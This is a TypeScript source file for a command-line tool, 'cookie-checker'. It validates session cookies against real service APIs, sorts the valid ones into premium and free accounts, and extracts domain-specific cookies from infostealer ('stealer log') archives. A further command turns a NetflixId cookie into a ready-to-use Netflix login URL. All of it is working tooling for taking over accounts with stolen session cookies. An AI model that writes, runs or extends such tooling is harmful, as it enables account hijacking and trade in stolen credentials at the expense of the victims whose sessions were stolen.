#!/usr/bin/env node
import { Command } from "commander";
import chalk from "chalk";
import ora from "ora";
import AdmZip from "adm-zip";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import { spawnSync } from "child_process";
import { checkCookie, getServiceList, type CookieCheckResult } from "./cookieChecker.js";
import { extractLogsFromDirectory, extractLogsForDomains } from "./logExtractor.js";
import { fetchNfToken, parseNetflixId } from "./nftoken.js";

// ─── Helpers ──────────────────────────────────────────────────────────────────

const program = new Command();

function banner() {
  console.log(chalk.cyan.bold("\n  Cookie Checker CLI"));
  console.log(chalk.dim("  ─────────────────────────────────────────\n"));
}

function extractArchive(srcPath: string, destDir: string): void {
  const ext = path.extname(srcPath).toLowerCase();
  const args = ["x", "-p-", `-o${destDir}`, srcPath, "-y", "-bso0", "-bsp0"];
  const r = spawnSync("7z", args, { stdio: "ignore", timeout: 300_000 });
  if (r.status !== 0) {
    // Fallback to AdmZip for ZIPs
    if (ext === ".zip") {
      new AdmZip(srcPath).extractAllTo(destDir, true);
    } else {
      throw new Error(
        `Archive extraction failed (exit ${r.status}). Make sure 7z / p7zip is installed.\n` +
        "  macOS:  brew install p7zip\n" +
        "  Debian: apt install p7zip-full\n" +
        "  Replit: already bundled"
      );
    }
  }
}

function saveZip(entries: Array<{ name: string; content: string }>, outPath: string): void {
  const zip = new AdmZip();
  for (const e of entries) zip.addFile(e.name, Buffer.from(e.content, "utf-8"));
  zip.writeZip(outPath);
}

function printResult(r: CookieCheckResult, index: number, total: number): void {
  const prefix = `  [${index + 1}/${total}]`;
  if (r.valid) {
    const tier = r.plan === "premium" ? chalk.yellow("👑 Premium") : chalk.green("🆓 Free");
    const who = [r.accountName, r.accountEmail].filter(Boolean).join(" / ");
    console.log(`${chalk.green("  ✔")} ${r.filename}  ${tier}  ${chalk.dim(who || "")}`);
  } else {
    console.log(`${chalk.red("  ✘")} ${r.filename}  ${chalk.dim(r.error ?? "Invalid")}`);
  }
}

// ─── check command ────────────────────────────────────────────────────────────

program
  .command("check <file>")
  .description("Validate cookies from a .txt / .json / .zip file against real service APIs")
  .option("-s, --service <domain>", "Force a specific service (e.g. netflix.com). Omit for auto-detect.")
  .option("-o, --output <dir>", "Directory to save valid cookie ZIPs", "output")
  .action(async (file: string, opts: { service?: string; output: string }) => {
    banner();

    if (!fs.existsSync(file)) {
      console.error(chalk.red(`  ✘ File not found: ${file}`));
      process.exit(1);
    }

    const ext = path.extname(file).toLowerCase();
    let entries: Array<{ name: string; content: string }> = [];

    if (ext === ".zip") {
      const zip = new AdmZip(file);
      entries = zip
        .getEntries()
        .filter((e) => !e.isDirectory && /\.(txt|json|cookies?|log)$/i.test(e.name))
        .map((e) => ({ name: e.name, content: e.getData().toString("utf-8") }));
    } else {
      entries = [{ name: path.basename(file), content: fs.readFileSync(file, "utf-8") }];
    }

    if (entries.length === 0) {
      console.error(chalk.red("  ✘ No supported cookie files found (.txt .json .cookies .log)"));
      process.exit(1);
    }

    const svcLabel = opts.service ?? "auto-detect";
    const spinner = ora(`Checking ${entries.length} file(s) against ${svcLabel}…`).start();

    const results: CookieCheckResult[] = [];
    for (let i = 0; i < entries.length; i++) {
      const e = entries[i]!;
      const r = await checkCookie(
        e.name,
        e.content,
        opts.service === "auto" || !opts.service ? undefined : opts.service,
      );
      results.push(r);
      spinner.text = `Checking… ${i + 1}/${entries.length}`;
    }

    spinner.stop();

    // ── Summary ──
    const valid = results.filter((r) => r.valid);
    const invalid = results.filter((r) => !r.valid);

    console.log(
      `\n  ${chalk.green.bold(`✔ ${valid.length} valid`)}  ${chalk.red(`✘ ${invalid.length} invalid`)}  ${chalk.dim(`of ${results.length} total`)}\n`,
    );

    results.forEach((r, i) => printResult(r, i, results.length));

    if (valid.length === 0) {
      console.log(chalk.dim("\n  No valid cookies — nothing saved."));
      return;
    }

    // ── Group and save ZIPs ──
    fs.mkdirSync(opts.output, { recursive: true });
    const groups = new Map<string, Array<{ name: string; content: string }>>();
    for (let i = 0; i < results.length; i++) {
      const r = results[i]!;
      if (!r.valid) continue;
      const key = `${r.service}_${r.plan ?? "checked"}`.replace(/\s+/g, "_").toLowerCase();
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key)!.push(entries[i]!);
    }

    console.log();
    for (const [key, items] of groups) {
      const zipPath = path.join(opts.output, `${key}.zip`);
      saveZip(items, zipPath);
      console.log(`  ${chalk.cyan("📦")} Saved ${items.length} cookie(s) → ${chalk.underline(zipPath)}`);
    }
    console.log();
  });

// ─── list-services command ────────────────────────────────────────────────────

program
  .command("services")
  .description("List all supported services")
  .action(() => {
    banner();
    const list = getServiceList();
    console.log(`  ${chalk.bold(String(list.length))} supported services:\n`);
    for (const s of list) {
      console.log(`  ${s.emoji}  ${chalk.bold(s.name)}  ${chalk.dim(s.domain)}`);
    }
    console.log();
  });

// ─── log command ──────────────────────────────────────────────────────────────

program
  .command("log <archive>")
  .description("Extract domain-specific cookies from stealer log archives (.zip .rar .7z)")
  .requiredOption("-d, --domains <list>", "Comma-separated domains to extract (e.g. netflix.com,spotify.com)")
  .option("-o, --output <dir>", "Directory to save extracted ZIPs", "output")
  .action(async (archive: string, opts: { domains: string; output: string }) => {
    banner();

    if (!fs.existsSync(archive)) {
      console.error(chalk.red(`  ✘ Archive not found: ${archive}`));
      process.exit(1);
    }

    const domains = opts.domains
      .split(/[\s,;]+/)
      .map((d) => d.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/^www\./, ""))
      .filter(Boolean);

    if (domains.length === 0) {
      console.error(chalk.red("  ✘ No valid domains provided. Example: --domains netflix.com,spotify.com"));
      process.exit(1);
    }

    console.log(`  Domains: ${chalk.cyan(domains.join(", "))}\n`);

    const ext = path.extname(archive).toLowerCase();
    let report;

    if (ext === ".zip") {
      // Fast path — use AdmZip in-memory (no extraction needed)
      const spinner = ora("Reading ZIP archive…").start();
      const buf = fs.readFileSync(archive);
      report = extractLogsForDomains(buf, domains);
      spinner.stop();
    } else {
      // RAR / 7z — extract to temp dir first
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "cclog-"));
      const spinner = ora("Extracting archive…").start();
      try {
        extractArchive(archive, tmpDir);
        spinner.text = "Scanning files…";
        report = extractLogsFromDirectory(tmpDir, domains);
      } finally {
        spinner.stop();
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    }

    // ── Summary ──
    if (report.services.length === 0) {
      console.log(
        chalk.yellow("  ⚠  No cookies found for the specified domains.\n") +
        chalk.dim(`     Files scanned: ${report.totalFilesScanned}  ·  Total cookies in archive: ${report.totalCookiesFound}`),
      );
      return;
    }

    console.log(
      `  ${chalk.green.bold(`✔ ${report.totalCookiesFound} cookies`)} found across ${chalk.bold(String(report.services.length))} domain(s)  ` +
      chalk.dim(`(${report.totalFilesScanned} files scanned)\n`),
    );

    for (const svc of report.services) {
      console.log(`  ${chalk.cyan("●")} ${chalk.bold(svc.domain)}  ${svc.files.length} session(s), ${svc.totalDomainCookies} cookie(s)`);
    }

    // ── Save ZIPs ──
    fs.mkdirSync(opts.output, { recursive: true });
    console.log();

    for (const svc of report.services) {
      const zipPath = path.join(opts.output, `${svc.domain}.zip`);
      const entries = svc.files.map((f, i) => ({
        name: `${svc.domain}_${i + 1}.txt`,
        content: f.domainContent,
      }));
      saveZip(entries, zipPath);
      console.log(`  ${chalk.cyan("📦")} ${svc.domain}  →  ${chalk.underline(zipPath)}`);
    }
    console.log();
  });

// ─── nftoken command ──────────────────────────────────────────────────────────

program
  .command("nftoken <cookie-file>")
  .description("Generate a Netflix login URL from a .txt / .json Netflix cookie file")
  .action(async (cookieFile: string) => {
    banner();

    let content: string;
    if (cookieFile === "-") {
      // Read from stdin
      const chunks: Buffer[] = [];
      for await (const chunk of process.stdin) chunks.push(chunk as Buffer);
      content = Buffer.concat(chunks).toString("utf-8");
    } else {
      if (!fs.existsSync(cookieFile)) {
        console.error(chalk.red(`  ✘ File not found: ${cookieFile}`));
        process.exit(1);
      }
      content = fs.readFileSync(cookieFile, "utf-8");
    }

    const netflixId = parseNetflixId(content);
    if (!netflixId) {
      console.error(
        chalk.red("  ✘ NetflixId cookie not found.\n") +
        chalk.dim("    Make sure the file is a Netscape .txt, JSON array, or raw cookie string containing NetflixId."),
      );
      process.exit(1);
    }

    console.log(`  ${chalk.dim("NetflixId found:")} ${chalk.dim(netflixId.slice(0, 30) + "…")}\n`);

    const spinner = ora("Calling Netflix iOS API…").start();
    try {
      const result = await fetchNfToken(content);
      spinner.stop();

      console.log(`  ${chalk.green("✔")} ${chalk.bold("Netflix Login URL:")}\n`);
      console.log(`  ${chalk.cyan.underline(result.url)}\n`);

      if (result.expiresAt && result.expiresInMinutes !== null) {
        const ttl =
          result.expiresInMinutes > 60
            ? `${Math.round(result.expiresInMinutes / 60)}h ${result.expiresInMinutes % 60}m`
            : `${result.expiresInMinutes} min`;
        console.log(`  ${chalk.dim("Expires in:")} ${chalk.yellow(ttl)}  ${chalk.dim(`(${result.expiresAt.toUTCString()})`)}\n`);
      }

      console.log(chalk.dim("  Tip: Open the URL in Chrome/Safari — do NOT open in-app or it may redirect to the app.\n"));
    } catch (err) {
      spinner.stop();
      console.error(chalk.red(`  ✘ ${(err as Error).message}`));
      process.exit(1);
    }
  });

// ─── Run ─────────────────────────────────────────────────────────────────────

program
  .name("cookie-checker")
  .description("Cookie checker, stealer-log extractor, and Netflix token generator")
  .version("1.0.0")
  .addHelpText(
    "after",
    `
${chalk.bold("Examples:")}
  cookie-checker services
  cookie-checker check cookies.zip
  cookie-checker check cookies.txt --service netflix.com --output ./results
  cookie-checker log logs.zip --domains netflix.com,spotify.com
  cookie-checker log logs.rar --domains chatgpt.com
  cookie-checker nftoken netflix.txt
  cat netflix.txt | cookie-checker nftoken -
`,
  );

program.parse(process.argv);
